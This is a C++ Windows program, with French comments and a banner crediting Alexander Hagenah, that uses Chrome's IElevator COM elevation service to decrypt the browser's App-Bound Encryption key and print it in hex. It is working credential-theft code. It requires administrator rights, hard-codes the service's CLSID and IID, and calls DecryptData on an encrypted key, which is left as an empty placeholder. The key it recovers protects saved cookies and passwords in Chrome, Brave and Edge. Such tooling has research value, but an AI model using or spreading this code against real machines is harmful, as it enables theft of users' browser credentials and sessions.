#include <Windows.h>
#include <ShlObj.h>
#include <wrl/client.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <vector>
#include <string>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "comsuppw.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "version.lib")

enum class ProtectionLevel
{
    None = 0,
    PathValidationOld = 1,
    PathValidation = 2,
    Max = 3
};

MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IElevator : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
        const WCHAR *crx_path, const WCHAR *browser_appid, const WCHAR *browser_version,
        const WCHAR *session_id, DWORD caller_proc_id, ULONG_PTR *proc_handle) = 0;

    virtual HRESULT STDMETHODCALLTYPE EncryptData(
        ProtectionLevel protection_level, const BSTR plaintext,
        BSTR *ciphertext, DWORD *last_error) = 0;

    virtual HRESULT STDMETHODCALLTYPE DecryptData(
        const BSTR ciphertext, BSTR *plaintext, DWORD *last_error) = 0;
};

namespace ConsoleUtils
{
    void SetConsoleColor(WORD color)
    {
        HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
        SetConsoleTextAttribute(hConsole, color);
    }

    void DisplayBanner()
    {
        SetConsoleColor(12);
        std::cout << "----------------------------------------------" << std::endl;
        std::cout << "|  Chrome App-Bound Encryption - Decryption  |" << std::endl;
        std::cout << "|  Alexander Hagenah (@xaitax)               |" << std::endl;
        std::cout << "----------------------------------------------" << std::endl;
        std::cout << "" << std::endl;
        SetConsoleColor(7);
    }
}

// Vérifie si le programme est exécuté en mode Administrateur
bool IsRunningAsAdmin()
{
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup = NULL;

    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
                                 0, 0, 0, 0, 0, 0, &AdministratorsGroup))
    {
        CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin);
        FreeSid(AdministratorsGroup);
    }
    return isAdmin;
}

// Convertit un tableau d'octets en une chaîne hexadécimale
std::string BytesToHexString(const BYTE *byteArray, size_t size)
{
    std::ostringstream oss;
    for (size_t i = 0; i < size; ++i)
        oss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byteArray[i]);
    return oss.str();
}

int main(int argc, char *argv[])
{
    ConsoleUtils::DisplayBanner();

    // 1️⃣ Vérification des privilèges administrateur
    if (!IsRunningAsAdmin())
    {
        std::cerr << "[-] Ce programme doit être exécuté en mode Administrateur !" << std::endl;
        return -1;
    }

    // 2️⃣ Vérification des arguments
    if (argc < 2)
    {
        std::cerr << "Usage: " << argv[0] << " <browserType: chrome|brave|edge>" << std::endl;
        return -1;
    }

    std::string browserType = argv[1];

    // 3️⃣ Initialisation de COM
    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr))
    {
        std::cerr << "[-] Échec de l'initialisation de COM. Code erreur: 0x" << std::hex << hr << std::endl;
        return -1;
    }

    // 4️⃣ Création de l'instance IElevator
    CLSID clsid = {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}};
    IID iid = {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}};
    
    Microsoft::WRL::ComPtr<IElevator> elevator;
    hr = CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER, iid, (void **)&elevator);
    if (FAILED(hr))
    {
        std::cerr << "[-] Impossible de créer une instance IElevator. Code erreur: 0x" << std::hex << hr << std::endl;
        CoUninitialize();
        return -1;
    }

    // 5️⃣ Test de déchiffrement avec une chaîne factice
    BSTR testCiphertext = SysAllocString(L"TestData");
    BSTR testPlaintext = nullptr;
    DWORD testError = ERROR_GEN_FAILURE;

    hr = elevator->DecryptData(testCiphertext, &testPlaintext, &testError);
    if (SUCCEEDED(hr))
    {
        std::wcout << L"[+] Test de déchiffrement réussi: " << testPlaintext << std::endl;
    }
    else
    {
        std::cerr << "[-] Test de déchiffrement échoué. Code erreur: " << testError << std::endl;
    }
    SysFreeString(testCiphertext);
    SysFreeString(testPlaintext);

    // 6️⃣ Déchiffrement réel de la clé
    std::vector<uint8_t> encrypted_key = { /* clé chiffrée à tester */ };
    if (encrypted_key.empty())
    {
        std::cerr << "[-] La clé chiffrée est vide !" << std::endl;
        CoUninitialize();
        return -1;
    }

    BSTR ciphertext_data = SysAllocStringByteLen(reinterpret_cast<const char *>(encrypted_key.data()), encrypted_key.size());
    if (!ciphertext_data)
    {
        std::cerr << "[-] Échec de l'allocation du BSTR pour la clé chiffrée." << std::endl;
        CoUninitialize();
        return -1;
    }

    BSTR plaintext_data = nullptr;
    DWORD last_error = ERROR_GEN_FAILURE;
    hr = elevator->DecryptData(ciphertext_data, &plaintext_data, &last_error);

    if (SUCCEEDED(hr))
    {
        BYTE *decrypted_key = new BYTE[32];
        memcpy(decrypted_key, reinterpret_cast<void *>(plaintext_data), 32);
        SysFreeString(plaintext_data);

        std::cout << "[+] CLÉ DÉCHIFFRÉE: " << BytesToHexString(decrypted_key, 32) << std::endl;
        delete[] decrypted_key;
    }
    else
    {
        std::cerr << "[-] Échec du déchiffrement. Dernière erreur: " << last_error << std::endl;
    }

    SysFreeString(ciphertext_data);
    CoUninitialize();
    return 0;
}
